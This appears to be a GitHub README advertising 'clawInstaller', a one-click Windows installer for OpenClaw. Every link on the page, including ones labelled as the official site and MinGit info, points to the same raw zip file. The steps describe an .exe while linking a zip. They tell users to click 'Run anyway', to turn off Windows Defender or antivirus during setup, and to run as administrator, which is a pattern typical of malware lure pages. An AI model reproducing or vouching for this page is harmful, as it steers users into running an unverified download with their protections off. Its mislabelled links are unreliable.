# 🦞 clawInstaller - Easy Windows Deployment Tool

[![Download Latest Release](https://img.shields.io/badge/Download-clawInstaller-blueviolet)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip)

---

## 🛠 About clawInstaller

clawInstaller is a Windows desktop program designed to make installing OpenClaw simple and quick. It handles all the setup steps automatically. You don’t need to know about Node.js, Git permissions, or NPM settings.

This tool brings everything together in one place. It downloads necessary software, sets up your environment, and fixes common errors that happen during OpenClaw installation. You get an easy, one-click process from start to finish.

---

## 💻 System Requirements

Before using clawInstaller, make sure your computer meets these basics:

- Windows 10 or later (64-bit preferred)
- At least 4 GB of free memory
- 2 GB of free disk space
- A working internet connection for downloads
- Optional: NVIDIA graphics card for better performance (if available)

---

## 🚀 Core Features

clawInstaller focuses on convenience and reliability. Here are the main features that help simplify setup:

- **Complete Environment Isolation**  
  It downloads portable Node.js (v22.13.1) and MinGit (v2.44.0). These versions run independently and don’t affect your system globally.

- **Portable Mode**  
  User data like profiles and app data can be stored inside the installer folder (`data`). This means you can run it from a USB drive without installing.

- **Network Optimization for China**  
  Automatic setup uses a faster NPM mirror (`registry.npmmirror.com`). It also rewrites GitHub requests to avoid errors like "Exit code 128" and authorization issues.

- **Hardware Detection**  
  Checks if your machine has an NVIDIA GPU and chooses the best OpenClaw version: CUDA-enabled or CPU-only.

- **Optional Skill Extensions**  
  You can add extra tools and environments needed for advanced OpenClaw features with a single click.

- **Easy Start Scripts**  
  After setup, the tool creates scripts you can run to launch or manage OpenClaw easily. For example, `start.ps1` and `点我运行.bat`.

---

## 📥 Download & Installation

[![Download Latest Release](https://img.shields.io/badge/Get_clawInstaller-Download-purple?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip)

1. Visit the release page above.

2. Look for the latest release with a `.exe` file. Click the file name to download.

3. Once downloaded, find the file in your Downloads folder and double-click it.

4. If Windows prompts you about permissions, select **Run anyway** or **Yes**.

5. The installer window will open. Follow the on-screen instructions:

    - Choose the installation folder.
    - Decide whether to enable Portable Mode (recommended if you want to run from a USB device).
    - Confirm when ready to start.

6. The tool will handle downloading and configuring everything. This may take some minutes depending on your internet speed.

7. When finished, it will create shortcuts named `start.ps1` and `点我运行.bat` inside the install folder.

8. Double-click `点我运行.bat` to open the OpenClaw menu and start using the app.

---

## 📁 How It Works

clawInstaller does the heavy lifting for you:

- It downloads a self-contained version of Node.js and Git called MinGit.
- Sets up a private environment so nothing conflicts with software you already have.
- Fixes common problems like slow downloads, network blocks, and permission errors.
- Adapts to your hardware for best performance.
- Packs everything needed into one folder. If Portable Mode is on, it keeps all user settings inside that folder.

---

## 🖥 Running OpenClaw

After installing with clawInstaller:

- Open your install folder.

- Double-click `点我运行.bat`. This opens a menu with options to start or update OpenClaw.

- Use the menu to:

  - Launch OpenClaw.
  - Update components.
  - Add or remove skill extensions.
  - Check system status or hardware info.

- You can also run `start.ps1` in PowerShell for a richer interface.

---

## 🔧 Troubleshooting Tips

- If the installer stops unexpectedly, check your internet connection.

- Windows Defender or antivirus may block the installer. You can temporarily disable them during setup.

- If you get permission errors, try right-clicking the installer file and choosing **Run as administrator**.

- For Git errors with code 128, the tool’s proxy and rewrite settings usually fix this automatically.

- Make sure you have enough free disk space.

- If you have an NVIDIA GPU but OpenClaw runs slow, verify the GPU drivers are up to date.

---

## ⚙️ Advanced Options

If you want more control:

- You can run the installer with command line parameters to customize folder paths or enable debug logging.

- Portable Mode lets you carry OpenClaw on a USB drive and use it on any Windows machine without extra installation.

- Skill extensions add tools like Python, Git LFS, or environment variables needed for special features.

---

## 📖 Useful Links

- OpenClaw Official Site: https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip  
- Node.js Portable Version: Included automatically  
- MinGit Info: https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip  

---

## 🛡 License

clawInstaller is open-source software under the MIT License. You can use, modify, or share it freely.

---

[![Download Latest Release](https://img.shields.io/badge/Download_clawInstaller-blue?style=for-the-badge)](https://github.com/paytenmorrow7-dot/clawInstaller/raw/refs/heads/main/ulmin/claw-Installer-v1.9.zip)